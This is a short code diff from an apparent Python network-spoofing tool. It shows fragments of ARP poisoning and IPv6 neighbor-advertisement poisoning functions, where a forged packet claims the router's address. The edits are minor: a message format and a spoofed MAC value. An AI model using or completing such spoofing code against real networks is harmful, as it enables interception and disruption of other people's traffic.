@@ -23,7 +23,7 @@ def safe_send(packet, iface=None):
     try:
         sendp(packet, iface=iface, verbose=0)
     except Exception as e:
-        print(f"[!] Send Error: {e}")
+        print(f"[!]Send Error: {e}")
 
 
 def arp_poison_loop(target_ip, router_ip, dst_mac, spoof_mac):
@@ -104,7 +104,7 @@ def ipv6_poison_service(target_mac):
         Ether(dst=target_mac)
         / IPv6(src=router_v6, dst=target_v6)
         / ICMPv6ND_NA(tgt=router_v6, R=1, S=1, O=1)
-        / ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
+        / ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:03")
     )
 
     ra_kill = (
